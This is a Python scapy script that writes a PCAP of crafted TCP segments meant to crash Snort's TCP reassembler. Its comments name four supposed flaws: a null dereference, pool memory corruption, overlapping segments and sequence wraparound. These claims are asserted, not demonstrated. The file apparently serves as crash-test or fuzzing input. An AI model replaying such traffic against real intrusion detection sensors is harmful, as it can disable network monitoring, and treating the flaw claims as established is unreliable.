#!/usr/bin/env python3
from scapy.all import *
import random
import struct

# Set up the IP addresses and ports
src_ip = "192.168.1.100"
dst_ip = "192.168.1.200"
src_port = 12345
dst_port = 80

# Initial sequence numbers
client_isn = random.randint(1000000000, 2000000000)
server_isn = random.randint(1000000000, 2000000000)

# Create the packets
packets = []

# TCP 3-way handshake
# SYN
syn = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="S", seq=client_isn)
packets.append(syn)

# SYN-ACK
syn_ack = IP(src=dst_ip, dst=src_ip)/TCP(sport=dst_port, dport=src_port, flags="SA", 
             seq=server_isn, ack=client_isn+1)
packets.append(syn_ack)

# ACK
ack = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="A", 
         seq=client_isn+1, ack=server_isn+1)
packets.append(ack)

# --------- VULNERABILITY #1: NULL POINTER DEREFERENCE IN flush_data_segments() ----------
# Key issue: The code assumes seglist.cur_rseg is non-null in many places

# First, send some normal data
base_seq = client_isn + 1
pkt1 = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="PA", 
         seq=base_seq, ack=server_isn+1)/Raw(load=b"A"*100)
packets.append(pkt1)

# Server ACK
ack1 = IP(src=dst_ip, dst=src_ip)/TCP(sport=dst_port, dport=src_port, flags="A", 
         seq=server_isn+1, ack=base_seq+100)
packets.append(ack1)

# Now create a series of out-of-order segments with a gap
# This targets logic in tcp_reassembler.cc that handles gaps

# Send segment that will be after the gap (high sequence number)
high_seq = base_seq + 1000
pkt2 = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="PA", 
         seq=high_seq, ack=server_isn+1)/Raw(load=b"B"*100)
packets.append(pkt2)

# Send segment right before the gap (this forces Snort to process segments in specific order)
pre_gap_seq = base_seq + 100
pkt3 = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="PA", 
         seq=pre_gap_seq, ack=server_isn+1)/Raw(load=b"C"*100)
packets.append(pkt3)

# Server ACKs these segments (potentially triggering reassembly)
ack2 = IP(src=dst_ip, dst=src_ip)/TCP(sport=dst_port, dport=src_port, flags="A", 
         seq=server_isn+1, ack=high_seq+100)
packets.append(ack2)

# --------- VULNERABILITY #2: MEMORY CORRUPTION IN TcpSegmentNode POOLING ----------
# In tcp_segment_node.cc, there's a memory pool for segments with sizes between 
# res_min (1024) and res_max (1460)

# Generate segments with sizes that will exercise the pool logic
for i in range(50):
    # Create payload right at the boundaries
    size = random.choice([1023, 1024, 1460, 1461])  # Just below min, min, max, just above max
    
    seq_num = high_seq + 100 + i*1500
    pkt = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="PA", 
             seq=seq_num, ack=server_isn+1)/Raw(load=b"X"*size)
    packets.append(pkt)
    
    # Server ACK
    ack = IP(src=dst_ip, dst=src_ip)/TCP(sport=dst_port, dport=src_port, flags="A", 
             seq=server_isn+1, ack=seq_num+size)
    packets.append(ack)

# --------- VULNERABILITY #3: EXCESSIVE OVERLAPPING SEGMENTS ----------
# The tcp_reassembler.cc code has issues when handling many overlapping segments

overlap_base = high_seq + 100000
overlap_size = 200

# Create a base segment
pkt_base = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="PA", 
              seq=overlap_base, ack=server_isn+1)/Raw(load=b"Z"*overlap_size)
packets.append(pkt_base)

# Now create many overlapping segments with varying degrees of overlap
for i in range(200):  # Create many overlapping segments
    # Vary the starting point within the original segment
    offset = i % overlap_size
    # Create different payload to force reassembly decisions
    payload = struct.pack("B", i % 256) * (overlap_size - offset)
    
    pkt = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="PA", 
             seq=overlap_base+offset, ack=server_isn+1)/Raw(load=payload)
    packets.append(pkt)

# --------- VULNERABILITY #4: INTEGER OVERFLOW IN SEQUENCE NUMBER HANDLING ----------
# Create packets with sequence numbers that might cause integer overflow issues

# Calculate a sequence number near the 32-bit boundary
near_wrap_seq = 0xFFFFFFFF - 1000
pkt_wrap1 = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="PA", 
              seq=near_wrap_seq, ack=server_isn+1)/Raw(load=b"W"*100)
packets.append(pkt_wrap1)

# Create a packet just past the wrap boundary
wrap_seq2 = 10  # This will be after the wrap
pkt_wrap2 = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="PA", 
              seq=wrap_seq2, ack=server_isn+1)/Raw(load=b"W"*100)
packets.append(pkt_wrap2)

# End the connection with a FIN
fin = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="FA", 
         seq=base_seq+5000, ack=server_isn+1)
packets.append(fin)

fin_ack = IP(src=dst_ip, dst=src_ip)/TCP(sport=dst_port, dport=src_port, flags="FA", 
             seq=server_isn+1, ack=base_seq+5001)
packets.append(fin_ack)

# Write the packets to a PCAP file
wrpcap("snort_tcp_crash.pcap", packets)
print(f"Created PCAP with {len(packets)} packets")
